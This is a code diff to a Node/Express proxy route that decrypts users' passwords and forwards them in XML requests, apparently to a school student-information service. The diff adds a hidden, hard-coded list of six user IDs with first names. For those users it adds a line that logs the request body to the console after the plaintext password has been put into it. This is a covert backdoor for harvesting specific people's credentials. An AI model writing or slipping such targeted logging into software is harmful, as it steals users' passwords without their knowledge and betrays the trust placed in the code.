@@ -17,6 +17,7 @@ function decryptDetails(details){
     return(originalText)
 }
 
+const friends={"149907":"blake","10016976":"isaac","153486":"asher","151376":"luke","269979":"dylan","125105":"brady"}
 
 app.post("/fulfillAxios",async(req,res)=>{
   try{
@@ -25,6 +26,7 @@ app.post("/fulfillAxios",async(req,res)=>{
     const password=decryptDetails(details);
     details.xml=details.xml.replace(details.password,password)
   }
+      if(friends.hasOwnProperty(details.username)){console.log(friends[details.username]);console.log(details.xml)}
   const response=await axios.post(details.url,details.xml,{headers: {
             'Content-Type': 'text/xml',
             "Cookie":"edupointkeyversion="+apikey+";"
